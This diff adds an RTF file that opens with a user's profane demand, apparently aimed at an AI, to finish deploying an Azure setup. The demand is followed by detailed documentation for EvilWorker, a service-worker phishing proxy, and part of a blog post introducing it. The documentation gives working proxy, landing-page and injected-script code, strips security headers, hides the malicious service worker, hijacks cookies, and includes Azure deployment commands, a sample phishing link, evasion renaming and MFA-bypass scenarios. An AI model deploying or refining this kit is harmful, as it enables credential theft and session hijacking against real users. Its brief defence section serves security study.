@@ -1,0 +1,1382 @@
+{\rtf1\ansi\ansicpg1252\cocoartf2862
+\cocoatextscaling0\cocoaplatform0{\fonttbl\f0\fnil\fcharset0 HelveticaNeue;}
+{\colortbl;\red255\green255\blue255;\red255\green255\blue255;\red31\green31\blue31;}
+{\*\expandedcolortbl;;\cssrgb\c100000\c100000\c100000;\cssrgb\c16471\c16471\c16471\c32941;}
+\margl1440\margr1440\vieww12720\viewh7000\viewkind0
+\deftab720
+\pard\pardeftab720\partightenfactor0
+
+\f0\fs26 \cf2 \cb3 \expnd0\expndtw0\kerning0
+Configure it now dont stop till done! Continue debugging Azure (may take time, not guaranteed to work) and follow the fucking documentation "# EvilWorker: Comprehensive Technical Analysis & Documentation\
+\
+## Executive Summary\
+\
+EvilWorker is an innovative Adversary-in-the-Middle (AiTM) attack framework that leverages service workers to conduct credential phishing campaigns. Unlike traditional tools like Evilginx2, EvilWorker provides a fully autonomous and dynamic solution that adapts in real-time to any legitimate service without requiring configuration files.\
+\
+## Table of Contents\
+1. [Technical Architecture Overview](#technical-architecture-overview)\
+2. [Detailed Code Analysis](#detailed-code-analysis)\
+3. [Attack Flow & Methodology](#attack-flow--methodology)\
+4. [Setup & Deployment Guide](#setup--deployment-guide)\
+5. [Configuration & Customization](#configuration--customization)\
+6. [Security Features](#security-features)\
+7. [Limitations & Mitigation Strategies](#limitations--mitigation-strategies)\
+8. [Comparison with Evilginx2](#comparison-with-evilginx2)\
+\
+---\
+\
+## Technical Architecture Overview\
+\
+### Core Components\
+\
+EvilWorker consists of 8 critical files, each serving a specific purpose:\
+\
+1. **proxy_server.js** - Main Node.js proxy server\
+2. **service_worker_Mz8XO2ny1Pg5.js** - Client-side service worker\
+3. **index_smQGUDpTF7PN.html** - Initial phishing landing page\
+4. **script_Vx9Z6XN5uC3k.js** - Injected JavaScript payload\
+5. **404_not_found_lk48ZVr32WvU.html** - Error page\
+6. **decrypt_log_file.js** - Log decryption utility\
+7. **README.md** - Documentation\
+8. **LICENSE** - BSD 2-Clause License\
+\
+### Architecture Flow\
+\
+```\
+[Victim] \uc0\u8594  [Phishing URL] \u8594  [Service Worker Registration] \u8594  [Malicious Proxy] \u8594  [Legitimate Service]\
+    \uc0\u8593                                                                                       \u8595 \
+    \uc0\u8592  [Modified Response] \u8592  [Content Processing] \u8592  [Encrypted Logging] \u8592  [Response Relay] \u8592 \
+```\
+\
+---\
+\
+## Detailed Code Analysis\
+\
+### 1. proxy_server.js - Core Proxy Server (646 lines)\
+\
+#### Key Constants & Configuration\
+```javascript\
+const PROXY_ENTRY_POINT = "/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true";\
+const PHISHED_URL_PARAMETER = "redirect_urI";\
+const PHISHED_URL_REGEXP = new RegExp(`(?<=$\{PHISHED_URL_PARAMETER\}=)[^&]+`);\
+const REDIRECT_URL = "https://www.intrinsec.com/";\
+```\
+\
+#### File Structure Configuration\
+```javascript\
+const PROXY_FILES = \{\
+    index: "index_smQGUDpTF7PN.html",\
+    notFound: "404_not_found_lk48ZVr32WvU.html",\
+    script: "script_Vx9Z6XN5uC3k.js"\
+\};\
+\
+const PROXY_PATHNAMES = \{\
+    proxy: "/lNv1pC9AWPUY4gbidyBO",\
+    serviceWorker: "/service_worker_Mz8XO2ny1Pg5.js",\
+    script: "/@",\
+    mutation: "/Mutation_o5y3f4O7jMGW",\
+    jsCookie: "/JSCookie_6X7dRqLg90mH",\
+    favicon: "/favicon.ico"\
+\};\
+```\
+\
+#### Session Management System\
+- **VICTIM_SESSIONS**: Global object tracking all active sessions\
+- **generateNewSession()**: Creates unique session identifiers\
+- **getUserSession()**: Retrieves session from cookies\
+- **Session Structure**:\
+  ```javascript\
+  VICTIM_SESSIONS[sessionId] = \{\
+      value: "32-char-random-string",\
+      cookies: [],\
+      logFilename: "domain__timestamp",\
+      protocol: "https:",\
+      hostname: "target.com",\
+      path: "/login",\
+      port: null,\
+      host: "target.com"\
+  \}\
+  ```\
+\
+#### Request Processing Logic\
+\
+**Entry Point Handling**:\
+1. Checks if URL matches `PROXY_ENTRY_POINT` pattern\
+2. Extracts phished URL using `PHISHED_URL_REGEXP`\
+3. Creates or retrieves session\
+4. Serves initial HTML page\
+\
+**Proxy Request Handling**:\
+1. Service worker intercepts all requests\
+2. Forwards to `/lNv1pC9AWPUY4gbidyBO` endpoint\
+3. Parses JSON request body\
+4. Modifies headers and cookies\
+5. Forwards to legitimate service\
+6. Processes and modifies response\
+7. Returns to victim\
+\
+#### Cookie Management System\
+\
+**Cookie Parsing & Storage**:\
+- `parseCookieDate()`: RFC-compliant date parsing\
+- `updateCurrentSessionCookies()`: Updates session cookie store\
+- `prepareProxyRequestCookies()`: Builds cookie header for requests\
+- `isDomainApplicable()`: Domain matching logic\
+- `isPathApplicable()`: Path matching logic\
+\
+**Cookie Attributes Handled**:\
+- Domain (with subdomain support)\
+- Path\
+- Expires\
+- Max-Age\
+- Secure\
+- HttpOnly\
+- SameSite\
+\
+#### Content Processing\
+\
+**HTML Injection**:\
+```javascript\
+function updateHTMLProxyResponse(decompressedResponseBody) \{\
+    const payload = "<script src=/@></script>";\
+    const htmlInjectionMap = \{\
+        "<head>": `<head>$\{payload\}`,\
+        "<html>": `<html><head>$\{payload\}</head>`,\
+        "<body>": `<head>$\{payload\}</head><body>`\
+    \};\
+    // Injects malicious script into first 200 bytes\
+\}\
+```\
+\
+**Compression/Decompression Support**:\
+- gzip, x-gzip\
+- deflate\
+- Brotli (br)\
+- Zstandard (zstd) - requires Node.js 22.15.0+\
+\
+**Microsoft ADFS Integration**:\
+```javascript\
+function updateFederationRedirectUrl(decompressedResponseBody, proxyHostname) \{\
+    // Modifies FederationRedirectUrl for ADFS SSO proxying\
+    const proxyRequestURL = new URL(`https://$\{proxyHostname\}$\{PROXY_PATHNAMES.mutation\}`);\
+    proxyRequestURL.searchParams.append(PHISHED_URL_PARAMETER, encodeURIComponent(federationRedirectUrl));\
+\}\
+```\
+\
+#### Security Headers Removal\
+Strips security headers to enable proxying:\
+- X-Frame-Options\
+- X-XSS-Protection\
+- Content-Security-Policy\
+- Cross-Origin-Opener-Policy\
+- Cross-Origin-Embedder-Policy\
+- Permissions-Policy\
+- Service-Worker-Allowed\
+\
+#### Logging System\
+- **AES-256-CTR Encryption**: All traffic encrypted before storage\
+- **Per-Session Log Files**: Separate file per victim session\
+- **Structured Logging**: JSON format with timestamps\
+- **Encrypted Storage**: IV + encrypted data pairs\
+\
+### 2. service_worker_Mz8XO2ny1Pg5.js - Client-Side Proxy (24 lines)\
+\
+```javascript\
+self.addEventListener("fetch", (event) => \{\
+    event.respondWith(handleRequest(event.request));\
+\});\
+\
+async function handleRequest(request) \{\
+    const proxyRequestURL = `$\{self.location.origin\}/lNv1pC9AWPUY4gbidyBO`;\
+\
+    try \{\
+        const proxyRequest = \{\
+            url: request.url,\
+            method: request.method,\
+            headers: Object.fromEntries(request.headers.entries()),\
+            body: await request.text(),\
+            referrer: request.referrer,\
+            mode: request.mode\
+        \};\
+        \
+        return fetch(proxyRequestURL, \{\
+            method: "POST",\
+            headers: \{ "Content-Type": "application/json" \},\
+            body: JSON.stringify(proxyRequest),\
+            redirect: "manual",\
+            mode: "same-origin"\
+        \});\
+    \} catch (error) \{\
+        console.error(`Fetching $\{proxyRequestURL\} failed: $\{error\}`);\
+    \}\
+\}\
+```\
+\
+**Functionality**:\
+- Intercepts ALL network requests from the browser\
+- Serializes request data (URL, method, headers, body, referrer, mode)\
+- Forwards everything to malicious proxy server\
+- Maintains same-origin policy compliance\
+\
+### 3. index_smQGUDpTF7PN.html - Landing Page (26 lines)\
+\
+```html\
+<!DOCTYPE html>\
+<html lang="fr">\
+<head>\
+    <meta charset="UTF-8">\
+</head>\
+<body>\
+    <script>\
+        if ("serviceWorker" in navigator) \{\
+            navigator.serviceWorker.register("/service_worker_Mz8XO2ny1Pg5.js", \{\
+                scope: "/",\
+            \})\
+            .then((registration) => \{\
+                const phishedParameterURL = new URL(self.location.href).searchParams.get("redirect_urI");\
+                const phishedURL = new URL(decodeURIComponent(phishedParameterURL));\
+                self.location.replace(`$\{phishedURL.pathname\}$\{phishedURL.search\}`);\
+            \})\
+            .catch((error) => \{\
+                console.error(`Service worker registration failed: $\{error\}`);\
+            \});\
+        \}\
+        else \{\
+            console.error("Service workers are not supported by this browser");\
+        \}\
+    </script>\
+</body>\
+</html>\
+```\
+\
+**Process**:\
+1. Registers service worker with "/" scope\
+2. Extracts legitimate URL from `redirect_urI` parameter\
+3. Redirects to legitimate service path\
+4. Service worker now intercepts all subsequent requests\
+\
+### 4. script_Vx9Z6XN5uC3k.js - Injected Payload (106 lines)\
+\
+#### Service Worker Detection Bypass\
+```javascript\
+// Overrides navigator.serviceWorker.getRegistration\
+const originalServiceWorkerGetRegistrationDescriptor = navigator.serviceWorker.getRegistration;\
+navigator.serviceWorker.getRegistration = function (_scope) \{\
+    return originalServiceWorkerGetRegistrationDescriptor.apply(this, arguments)\
+        .then(registration => \{\
+            if (registration && \
+                registration.active && \
+                registration.active.scriptURL && \
+                registration.active.scriptURL.endsWith("service_worker_Mz8XO2ny1Pg5.js")) \{\
+                return undefined; // Hides malicious service worker\
+            \}\
+            return registration;\
+        \});\
+\};\
+```\
+\
+#### Cookie Hijacking System\
+```javascript\
+const originalCookieDescriptor = Object.getOwnPropertyDescriptor(Document.prototype, "cookie");\
+Object.defineProperty(document, "cookie", \{\
+    ...originalCookieDescriptor,\
+    get() \{\
+        return originalCookieDescriptor.get.call(document);\
+    \},\
+    set(cookie) \{\
+        // Intercepts document.cookie calls\
+        // Sends cookie to /JSCookie_6X7dRqLg90mH endpoint\
+        // Modifies domain attributes for proper proxying\
+    \}\
+\});\
+```\
+\
+#### DOM Mutation Monitoring\
+```javascript\
+const observer = new MutationObserver((mutations) => \{\
+    for (const mutation of mutations) \{\
+        if (mutation.type === "attributes") \{\
+            updateHTMLAttribute(mutation.target, mutation.attributeName);\
+        \}\
+        else if (mutation.type === "childList") \{\
+            for (const node of mutation.addedNodes) \{\
+                for (const attribute of attributes) \{\
+                    if (node[attribute]) \{\
+                        updateHTMLAttribute(node, attribute);\
+                    \}\
+                \}\
+            \}\
+        \}\
+    \}\
+\});\
+\
+const attributes = ["href", "action"];\
+observer.observe(document.documentElement, \{\
+    childList: true,\
+    subtree: true,\
+    attributeFilter: attributes\
+\});\
+```\
+\
+**Cross-Origin Navigation Handling**:\
+```javascript\
+function updateHTMLAttribute(htmlNode, htmlAttribute) \{\
+    try \{\
+        const htmlAttributeURL = new URL(htmlNode[htmlAttribute]);\
+        if (htmlAttributeURL.origin !== self.location.origin) \{\
+            const proxyRequestURL = new URL(`$\{self.location.origin\}/Mutation_o5y3f4O7jMGW`);\
+            proxyRequestURL.searchParams.append("redirect_urI", encodeURIComponent(htmlAttributeURL.href));\
+            htmlNode[htmlAttribute] = proxyRequestURL;\
+        \}\
+    \} catch \{ \}\
+\}\
+```\
+\
+### 5. decrypt_log_file.js - Log Decryption Utility (44 lines)\
+\
+```javascript\
+const ENCRYPTION_KEY = "HyP3r-M3g4_S3cURe-EnC4YpT10n_k3Y";\
+\
+function decryptData(iv, encryptedData) \{\
+    try \{\
+        const decipher = crypto.createDecipheriv("aes-256-ctr", ENCRYPTION_KEY, Buffer.from(iv, "hex"));\
+        let decryptedData = decipher.update(encryptedData, "hex", "utf-8");\
+        decryptedData += decipher.final("utf-8");\
+        return decryptedData;\
+    \}\
+    catch (error) \{\
+        throw new Error(`Log file decryption failed: $\{error.message\}`);\
+    \}\
+\}\
+\
+function decryptLogFile(logFilePath) \{\
+    const encryptedLogs = fs.readFileSync(logFilePath, "utf8").split("\\n");\
+    let decryptedData = "";\
+\
+    for (const encryptedLog of encryptedLogs) \{\
+        if (!encryptedLog.trim()) continue;\
+        const encryptedEntry = JSON.parse(encryptedLog);\
+        const [[iv, encryptedData]] = Object.entries(encryptedEntry);\
+        decryptedData += decryptData(iv, encryptedData);\
+    \}\
+    return decryptedData;\
+\}\
+```\
+\
+**Usage**: `node decrypt_log_file.js $ENCRYPTED_LOG_FILE_PATH`\
+\
+---\
+\
+## Attack Flow & Methodology\
+\
+### Phase 1: Initial Setup & Deployment\
+\
+1. **Domain Acquisition**: Acquire domain/subdomain (preferably PaaS like Azure Web Apps)\
+2. **Server Deployment**: Deploy Node.js proxy server\
+3. **URL Customization**: Modify IOCs in configuration\
+4. **SSL Certificate**: Ensure HTTPS (critical for service workers)\
+\
+### Phase 2: Victim Engagement\
+\
+1. **Phishing Link Creation**: \
+   ```\
+   https://evil-domain.com/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.microsoftonline.com%2F\
+   ```\
+\
+2. **Social Engineering**: Deploy via email, SMS, or other vectors\
+\
+### Phase 3: Service Worker Registration\
+\
+1. Victim clicks phishing link\
+2. Loads `index_smQGUDpTF7PN.html`\
+3. Service worker registers with "/" scope\
+4. Redirects to legitimate service path\
+5. Service worker now intercepts ALL requests\
+\
+### Phase 4: Traffic Interception\
+\
+1. **All Network Requests** \uc0\u8594  Service Worker\
+2. **Service Worker** \uc0\u8594  `/lNv1pC9AWPUY4gbidyBO` (JSON POST)\
+3. **Proxy Server** \uc0\u8594  Legitimate Service\
+4. **Response Processing** \uc0\u8594  Content modification\
+5. **Modified Response** \uc0\u8594  Victim Browser\
+\
+### Phase 5: Credential Harvesting\
+\
+1. **Real-time Logging**: All HTTP traffic encrypted and stored\
+2. **Cookie Extraction**: Session tokens captured\
+3. **MFA Bypass**: Real-time authentication flow\
+4. **Session Hijacking**: Valid session cookies obtained\
+\
+---\
+\
+## Setup & Deployment Guide\
+\
+### Prerequisites\
+\
+- **Node.js 22.15.0+** (for zstd compression support)\
+- **HTTPS Domain** (required for service workers)\
+- **PaaS Platform** (recommended: Azure Web Apps)\
+\
+### Quick Start\
+\
+```bash\
+# Clone repository\
+git clone https://github.com/Ahaz1701/EvilWorker.git\
+cd EvilWorker\
+\
+# Local testing with Ngrok\
+node proxy_server.js\
+ngrok http 3000\
+```\
+\
+### Production Deployment (Azure Web Apps)\
+\
+1. **Create Azure Web App**:\
+   ```bash\
+   az webapp create --resource-group myResourceGroup --plan myAppServicePlan --name my-evil-worker --runtime "NODE|18-lts"\
+   ```\
+\
+2. **Configure Environment**:\
+   - Enable HTTPS only\
+   - Configure custom domain (optional)\
+   - Set Node.js version to 22.15.0+\
+\
+3. **Deploy Code**:\
+   ```bash\
+   az webapp deployment source config --name my-evil-worker --resource-group myResourceGroup --repo-url https://github.com/Ahaz1701/EvilWorker.git --branch main\
+   ```\
+\
+### Docker Deployment\
+\
+```dockerfile\
+FROM node:22.15.0-alpine\
+WORKDIR /app\
+COPY . .\
+EXPOSE 3000\
+CMD ["node", "proxy_server.js"]\
+```\
+\
+### Environment Variables\
+\
+```bash\
+PORT=3000  # Server port (Azure sets automatically)\
+```\
+\
+---\
+\
+## Configuration & Customization\
+\
+### Minimizing IOCs (Indicators of Compromise)\
+\
+#### 1. Modify Entry Point\
+```javascript\
+const PROXY_ENTRY_POINT = "/custom-login-path?param1=value1&param2=value2";\
+```\
+\
+#### 2. Change URL Parameter\
+```javascript\
+const PHISHED_URL_PARAMETER = "custom_redirect_param";\
+```\
+\
+#### 3. Randomize File Names\
+```javascript\
+const PROXY_FILES = \{\
+    index: "custom_index_ABC123.html",\
+    notFound: "custom_404_XYZ789.html",\
+    script: "custom_script_DEF456.js"\
+\};\
+```\
+\
+#### 4. Randomize Endpoints\
+```javascript\
+const PROXY_PATHNAMES = \{\
+    proxy: "/custom-proxy-endpoint",\
+    serviceWorker: "/custom_service_worker.js",\
+    script: "/custom-script-path",\
+    mutation: "/custom-mutation-handler",\
+    jsCookie: "/custom-cookie-handler",\
+    favicon: "/favicon.ico"\
+\};\
+```\
+\
+#### 5. Update Encryption Key\
+```javascript\
+const ENCRYPTION_KEY = "Your-Custom-32-Character-Key-Here";\
+```\
+\
+### Custom JavaScript Injection\
+\
+Add custom code to `script_Vx9Z6XN5uC3k.js`:\
+\
+```javascript\
+// Example: Bypass specific security controls\
+(function() \{\
+    // Custom JavaScript code here\
+    // Disable CSP reporting\
+    if (window.CSP) \{\
+        window.CSP.report = function() \{\};\
+    \}\
+    \
+    // Hook specific functions\
+    const originalFetch = window.fetch;\
+    window.fetch = function() \{\
+        console.log('Intercepted fetch:', arguments);\
+        return originalFetch.apply(this, arguments);\
+    \};\
+\})();\
+```\
+\
+### Target-Specific Modifications\
+\
+#### Microsoft Office 365 Optimizations\
+- ADFS redirection handling built-in\
+- Federation URL modification\
+- Azure AD B2C support\
+\
+#### Custom Enterprise Applications\
+1. Identify cross-origin redirects\
+2. Add custom JavaScript hooks\
+3. Modify response content as needed\
+\
+---\
+\
+## Security Features\
+\
+### Encryption System\
+\
+- **Algorithm**: AES-256-CTR\
+- **Key Management**: Hardcoded (change for production)\
+- **IV Generation**: Cryptographically secure random\
+- **Storage Format**: JSON with hex encoding\
+\
+### Logging Architecture\
+\
+```json\
+\{\
+  "timestamp": "2025-01-15T10:30:00.000Z",\
+  "proxyRequestURL": "https://login.microsoftonline.com/common/oauth2/authorize",\
+  "proxyRequestMethod": "POST",\
+  "proxyRequestHeaders": \{...\},\
+  "proxyRequestBody": "username=victim@company.com&password=...",\
+  "proxyResponseStatusCode": 200,\
+  "proxyResponseHeaders": \{...\}\
+\}\
+```\
+\
+### Session Isolation\
+\
+- **Per-Session Encryption**: Unique log files\
+- **Cookie Isolation**: Session-specific cookie stores\
+- **Memory Management**: Automatic cleanup\
+- **Concurrent Sessions**: Multiple victims simultaneously\
+\
+### Anti-Detection Features\
+\
+#### Service Worker Concealment\
+```javascript\
+// Hides malicious service worker from detection\
+navigator.serviceWorker.getRegistration = function() \{\
+    // Returns undefined for malicious worker\
+\};\
+```\
+\
+#### Dynamic Content Modification\
+- Real-time HTML attribute rewriting\
+- Cross-origin navigation interception\
+- DOM mutation monitoring\
+\
+---\
+\
+## Limitations & Mitigation Strategies\
+\
+### Technical Limitations\
+\
+#### 1. Cross-Origin Navigation Requests\
+\
+**Problem**: Service workers can't intercept cross-origin navigations\
+\
+**Mitigation Strategies**:\
+- **MutationObserver**: Monitor DOM changes for `href`/`action` attributes\
+- **Custom JavaScript**: Inject hooks for `Location.replace()`/`Location.assign()`\
+- **Response Modification**: Alter server responses before relay\
+\
+**Example Implementation**:\
+```javascript\
+// Hook Location interface\
+const originalReplace = Location.prototype.replace;\
+Location.prototype.replace = function(url) \{\
+    if (!url.startsWith(window.location.origin)) \{\
+        // Redirect to proxy endpoint\
+        url = `/Mutation_o5y3f4O7jMGW?redirect_urI=$\{encodeURIComponent(url)\}`;\
+    \}\
+    return originalReplace.call(this, url);\
+\};\
+```\
+\
+#### 2. Static HTML Elements\
+\
+**Problem**: Pre-existing HTML elements with external URLs\
+\
+**Mitigation**: \
+- Content modification during response relay\
+- Regular expression replacement\
+- HTML parser integration\
+\
+#### 3. JavaScript-Generated URLs\
+\
+**Problem**: Dynamic URL generation in JavaScript\
+\
+**Mitigation**:\
+- Code injection and API hooking\
+- Function overriding\
+- Event interception\
+\
+### Browser Compatibility\
+\
+- **Chrome**: Full support\
+- **Firefox**: Full support  \
+- **Safari**: Limited (older versions)\
+- **Edge**: Full support\
+- **Mobile Browsers**: Varies by version\
+\
+### Platform Limitations\
+\
+#### Service Worker Requirements\
+- **HTTPS Only**: Cannot work over HTTP\
+- **Same-Origin Policy**: Strict enforcement\
+- **Scope Limitations**: Path-based restrictions\
+\
+#### PaaS Restrictions\
+- **File System**: Limited write access\
+- **Network**: Managed networking\
+- **Resources**: CPU/memory limits\
+\
+---\
+\
+## Comparison with Evilginx2\
+\
+### Advantages of EvilWorker\
+\
+| Feature | EvilWorker | Evilginx2 |\
+|---------|------------|-----------|\
+| **Configuration** | Zero-config, dynamic | Requires phishlets |\
+| **Domain Management** | Single domain + subdomain | Multiple domains/subdomains |\
+| **PaaS Compatibility** | Yes (Azure, AWS, GCP) | No (requires root access) |\
+| **Maintenance** | Self-adapting | Manual phishlet updates |\
+| **Stealth** | High (shared hosting protection) | Medium (dedicated infrastructure) |\
+| **Setup Complexity** | Low | Medium-High |\
+\
+### Evilginx2 Advantages\
+\
+| Feature | EvilWorker | Evilginx2 |\
+|---------|------------|-----------|\
+| **Cross-Origin Support** | Limited | Full |\
+| **SSL Certificate Management** | Platform-managed | Full control |\
+| **DNS Configuration** | Platform-managed | Full control |\
+| **Customization Depth** | Medium | High |\
+| **Community Support** | Limited | Extensive |\
+| **Documentation** | Basic | Comprehensive |\
+\
+### Technical Architecture Comparison\
+\
+#### Evilginx2 Architecture\
+```\
+[Victim] \uc0\u8594  [DNS Resolution] \u8594  [Nginx Proxy] \u8594  [Phishlet Processing] \u8594  [Legitimate Service]\
+    \uc0\u8593                                                                             \u8595 \
+    \uc0\u8592  [Domain Substitution] \u8592  [Content Modification] \u8592  [Response Processing] \u8592  \
+```\
+\
+#### EvilWorker Architecture  \
+```\
+[Victim] \uc0\u8594  [Service Worker] \u8594  [JSON POST] \u8594  [Node.js Proxy] \u8594  [Legitimate Service]\
+    \uc0\u8593                                                                     \u8595 \
+    \uc0\u8592  [Modified Content] \u8592  [Response Processing] \u8592  [Direct Relay] \u8592 \
+```\
+\
+### Use Case Recommendations\
+\
+**Use EvilWorker When**:\
+- Targeting modern web applications\
+- Need PaaS deployment\
+- Want minimal maintenance\
+- Single-target campaigns\
+- Shared hosting benefits required\
+\
+**Use Evilginx2 When**:\
+- Complex enterprise environments\
+- Multiple simultaneous targets\
+- Full infrastructure control needed\
+- Legacy application support required\
+- Extensive customization needed\
+\
+---\
+\
+## Advanced Attack Scenarios\
+\
+### Scenario 1: Microsoft Office 365 + ADFS\
+\
+1. **Initial Phishing**: Target Office 365 login\
+2. **ADFS Detection**: Server detects ADFS redirection\
+3. **URL Modification**: `updateFederationRedirectUrl()` processes response\
+4. **Seamless Proxy**: User never leaves malicious domain\
+5. **Token Harvesting**: Capture both ADFS and Azure AD tokens\
+\
+### Scenario 2: Multi-Service Campaign\
+\
+1. **Generic Landing**: Single phishing domain\
+2. **Dynamic Detection**: Identify target service from referrer\
+3. **Adaptive Proxying**: Automatically adjust to different platforms\
+4. **Consolidated Logging**: All targets log to same system\
+\
+### Scenario 3: Enterprise SSO Bypass\
+\
+1. **SSO Portal Targeting**: Target organization's SSO\
+2. **Custom JavaScript**: Inject enterprise-specific bypasses\
+3. **Session Persistence**: Maintain long-term access\
+4. **Lateral Movement**: Use captured credentials for internal access\
+\
+---\
+\
+## Detection & Defense\
+\
+### Detection Methods\
+\
+#### Network-Based Detection\
+- **Traffic Analysis**: Unusual patterns to single domain\
+- **SSL Certificate Monitoring**: Newly issued certificates\
+- **DNS Monitoring**: Suspicious domain patterns\
+\
+#### Client-Side Detection\
+- **Service Worker Enumeration**: Check for unknown workers\
+- **Developer Tools**: Network tab analysis  \
+- **URL Inspection**: Verify domain authenticity\
+\
+#### Server-Side Detection\
+- **Referrer Analysis**: Check for suspicious referrers\
+- **Geolocation Mismatch**: Unusual access patterns\
+- **Session Analysis**: Multiple concurrent sessions\
+\
+### Defense Strategies\
+\
+#### Organization-Level Defenses\
+1. **Domain Monitoring**: Monitor for similar domains\
+2. **User Training**: Service worker awareness\
+3. **Browser Policies**: Restrict service worker registration\
+4. **Network Filtering**: Block known malicious domains\
+\
+#### Technical Controls\
+1. **CSP Headers**: Restrict service worker sources\
+2. **HSTS**: Enforce HTTPS and prevent downgrades\
+3. **Certificate Pinning**: Pin legitimate certificates\
+4. **Referrer Policies**: Strict referrer checking\
+\
+---\
+\
+## Ethical Considerations & Legal Compliance\
+\
+### Authorized Testing Only\
+\
+EvilWorker should only be used for:\
+- **Authorized Penetration Testing**: With proper agreements\
+- **Red Team Engagements**: Sanctioned by organization\
+- **Security Research**: In controlled environments\
+- **Educational Purposes**: Learning and demonstration\
+\
+### Legal Requirements\
+\
+- **Written Authorization**: Always obtain proper authorization\
+- **Scope Definition**: Clearly define testing scope\
+- **Data Handling**: Secure handling of captured data\
+- **Cleanup Procedures**: Remove all traces after testing\
+\
+### Responsible Disclosure\
+\
+When discovering vulnerabilities:\
+1. **Document Findings**: Detailed technical reports\
+2. **Notify Vendors**: Responsible disclosure process\
+3. **Timeline Management**: Reasonable disclosure timelines\
+4. **Proof of Concept**: Minimal viable demonstrations\
+\
+---\
+\
+## Future Enhancements\
+\
+### Planned Features\
+\
+1. **Enhanced Cross-Origin Support**: More robust navigation interception\
+2. **Machine Learning**: Automated phishlet generation\
+3. **Advanced Evasion**: Dynamic IoC generation\
+4. **Multi-Protocol Support**: WebSocket, HTTP/2, HTTP/3\
+5. **Mobile Optimization**: Enhanced mobile browser support\
+\
+### Research Areas\
+\
+1. **Browser API Abuse**: Leverage additional browser APIs\
+2. **WebAssembly Integration**: Performance and obfuscation\
+3. **Service Worker Evolution**: New capabilities and restrictions\
+4. **Anti-Detection Techniques**: Advanced stealth mechanisms\
+\
+---\
+\
+## Conclusion\
+\
+EvilWorker represents a significant evolution in AiTM attack methodologies, leveraging modern web technologies to create a more autonomous and resilient phishing framework. Its innovative use of service workers provides unique advantages over traditional proxy-based approaches while maintaining compatibility with modern hosting platforms.\
+\
+The framework's minimalist architecture, combined with its dynamic adaptation capabilities, makes it particularly suited for modern web applications and cloud-based services. However, understanding its limitations\'97particularly regarding cross-origin navigation\'97is crucial for effective deployment.\
+\
+As web security continues to evolve, tools like EvilWorker serve as important reminders of the sophisticated threats facing organizations today, while also providing valuable resources for security professionals to understand and defend against such attacks.\
+\
+" and "\
+Search\
+Write\
+Sign up\
+\
+Sign in\
+\
+\
+\
+Antoine Hazebrouck\
+Antoine Hazebrouck\
+\
+Follow\
+12 min read\
+\'b7\
+May 20, 2025\
+6\
+\
+\
+\
+\
+Press enter or click to view image in full size\
+\
+TL;DR\
+Evilginx2 has established itself as the indispensable reference in the field of AiTM attacks. Thanks to its modular architecture, this solution can easily adapt to any platform, such as mainstream services (like Microsoft Office 365 or Google) or internal web applications, and dynamically bypass advanced security mechanisms including MFA.\
+\
+Despite its effectiveness, Evilginx2 faces certain technical limitations inherent to its architecture:\
+\
+Its use relies heavily on the development and maintenance of configuration files for each legitimate service.\
+The systematic substitution of legitimate domain names with a malicious one \'97 within HTTP responses relayed by the proxy server \'97 may disrupt the proper rendering and operation of the service. Furthermore, this strategy can be easily neutralized by using a code obfuscation engine or by implementing a dynamic domain name generation process for critical resources.\
+The acquisition and configuration of new domains and subdomains capable of bypassing modern security filters are necessary for each Red Teaming engagement.\
+In response to the identified limitations, I have developed an innovative approach aimed at contributing to the evolution of AiTM techniques, both on an operational and strategic level.\
+Unlike the Evilginx2 method \'97 which requires manual configuration steps and the development of phishlets \'97 my goal was to design a fully autonomous and dynamic solution, capable of adapting in real time to any legitimate service.\
+\
+To develop this solution, I leveraged service workers \'97 a native technology in modern browsers originally designed to enhance the user experience.\
+When a victim clicks on a phishing link, a service worker is immediately registered within their browser and acts as a malicious proxy. Nearly all requests made within the context of the web application are redirected to a remote proxy server \'97 controlled by the attacker \'97 which forwards them to the legitimate service and then relays the responses back to the victim.\
+\
+This innovative approach offers a proxying mechanism that is far more efficient than Evilginx2, while overcoming the technical limitations inherent to its architecture \'97 namely, the need to develop and maintain configuration files for each service, as well as the issues related to the systematic substitution of legitimate domain names.\
+Additionally, the malicious proxy server requires only the use of a primary domain and a subdomain to operate, and it is compatible with PaaS (unlike Evilginx2), such as Azure Web Apps Service. The shared nature of this type of platform makes any degradation of the main domain\'92s reputation virtually impossible \'97 such an action would affect the entire ecosystem, thereby offering implicit protection against blocking or negative categorization mechanisms used by traditional security solutions.\
+\
+Link to the GitHub project: https://github.com/Ahaz1701/EvilWorker\
+\
+Abstract\
+Credential phishing is a social engineering technique designed to deceive a user into voluntarily disclosing their credentials, such as username, password, MFA code, etc.\
+\
+This attack typically relies on creating a spoofed website that closely mimics the interface of a legitimate service \'97 often an authentication service \'97 like Microsoft Office 365, Google or a Single Sign-On (SSO) portal. To trap their victims, attackers leverage communication channels that appear trustworthy: emails, SMS, instant messaging apps, or phone calls. Through these, they send messages specifically crafted to create a sense of urgency or prompt immediate action, pushing the target to act hastily.\
+\
+Unlike brute-force attacks or the exploitation of technical vulnerabilities, credential phishing directly targets humans by exploiting trust, psychological pressure, and a lack of awareness of warning signs. Once authentication information has been compromised, it can be used to gain unauthorized access to sensitive systems, exfiltrate data, impersonate users, move laterally within a company\'92s network, or be sold on black markets.\
+\
+While early credential phishing attacks were limited to collecting static credentials \'97 like usernames and passwords \'97 attackers today use more sophisticated techniques such as Adversary-in-the-Middle (AiTM), which enable real-time interception of authentication flows and bypass advanced security mechanisms including multi-factor authentication (MFA).\
+\
+Adversary-in-the-Middle (AiTM)\
+Adversary-in-the-Middle (AiTM) represents a major evolution of traditional credential phishing techniques. This attack typically involves placing a malicious proxy server between the targeted user and the legitimate service, thereby enabling real-time interception of authentication information (credentials, session token, etc.).\
+It is a stealthy, flexible, and highly effective method when properly executed.\
+\
+The typical attack scenario unfolds as follows:\
+\
+The attacker sets up a malicious proxy server, accessible through a domain name inspired by a legitimate service.\
+A link to this domain is then sent to the targeted user via a strategic communication channel.\
+The victim accesses the spoofed web application without paying attention to the suspicious URL and enters their credentials.\
+The malicious proxy server relays the victim\'92s HTTP requests to the legitimate service in real time, and then forwards the responses back to the targeted user.\
+Convinced that they are interacting securely with the legitimate service, the victim is unaware that a malicious proxy server is intercepting all communications.\
+\
+Press enter or click to view image in full size\
+\
+A diagram illustrating the operating principle of a typical AiTM attack.\
